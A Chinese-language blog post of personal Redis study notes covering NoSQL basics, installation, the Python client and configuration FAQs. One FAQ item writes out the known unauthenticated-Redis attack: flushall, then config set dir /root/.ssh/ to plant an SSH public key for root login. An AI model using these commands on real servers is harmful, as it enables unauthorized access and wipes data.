---
layout: post
date:   2017-06-06 20:15:00 +0800
categories: nosql
---

当我真正的接触到了Redis的时候，我被它的速度震惊了，因为它甚至比python内置的数据结构还要快。
在学习redis之前有几个问题可以先思考一下

1.系统的瓶颈出现在哪里？
IO读写，涉及到了磁盘操作，而这里速度是影响性能的主要因素
寄存器->内存->磁盘
依次是，存储量变大，但速度变慢。
2.NoSql是什么？
数据库有关系型数据库，结构化存储，支持SQL语句，这是我们所熟悉的，也是技术比较成熟的。
还有一种not only sql,例如redis通过key-value存储数据。
3.数据的持久化保存和速度之间的矛盾如何解决
要想持久化就不可避免的应用到磁盘，速度会下降，如何解决这两个矛盾呢？

Redis出现了，说起它的作者，你可能用过他写的另一个工具hping。
Redis有哪些特点？

1.数据可以存储到磁盘，提高可靠性
2.数据存放在内存中，可以定时保存到存储中。
3.多种数据结构的支持。

redis安装和使用

在linux上通过源码编译安装。
redis本身没有提供windows版本，但微软公司维护了一份可在windows用的redis,但是网络好像不通。
从下面这个地址获取windos版本的编译好的二进制redis文件
https://github.com/dmajkic/redis/downloads
redis-server默认会占用系统的6379号端口。
redis有多种客户端，但其本质都是连接到server，然后执行命令。

redis的配置

redis.conf文件是配置文件。

redis的数据类型

键与值在计算机术语中很常见了。
我通过python接口来学习了。
import redis
conn = redis.Redis()
1.字符串：

redis-cli中
设置键和值
set key value
获取键对应的值
get key

2.列表


3.哈希表


4.集合


5.有序集合


6.位图



总结：对于我们不了解的技术总是心生畏惧，可但凡你投入几个小时学习一下，你就话发现一片崭新的天地。

## install
```
cd redis-3.2.9
make
make install
cd utils
./install_server.sh

```

如下配置
```
Selected config:
Port           : 6379
Config file    : /etc/redis/6379.conf
Log file       : /var/log/redis_6379.log
Data dir       : /var/lib/redis/6379
Executable     : /usr/local/bin/redis-server
Cli Executable : /usr/local/bin/redis-cli

```

### 安装python接口
```
cd redis-2.10.5
python setup.py install
```
### FAQ
1. 如何配置密码？
/etc/redis/6379.conf 配置requirepass helloworld

pkill redis-server

2. 如何进行鉴权？

在用户层面只要这样就可以了
auth passsword

在实现层面会更复杂

3. python客户端做了哪些事？

例如数据库返回OK，则python把它转化为True

4.redis漏洞利用

我认为该漏洞的核心在于redis key的value竟然是明文存储的

ref:
[https://zhuoroger.github.io/2016/07/29/redis-sec/](https://zhuoroger.github.io/2016/07/29/redis-sec/)

Your public key has been saved in /root/.ssh/id_rsa.pub

echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n"
 
/root/.ssh/authorized_keys 这个是存放公钥的文件，如果这个文件中存放了别人的公钥，那么别人就可以利用他对应的私钥面密登陆。
 
如果Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。
```
config get dir
1) "dir"
2) "/var/lib/redis/6379
```

```
flushall

config set dir /root/.ssh/

config set dbfilename authorize_keys

cat r.txt |redis-cli  -a redispassword -x set a
```

4.使用redis作为django的缓存

reference:

[https://github.com/niwinz/django-redis](https://github.com/niwinz/django-redis)
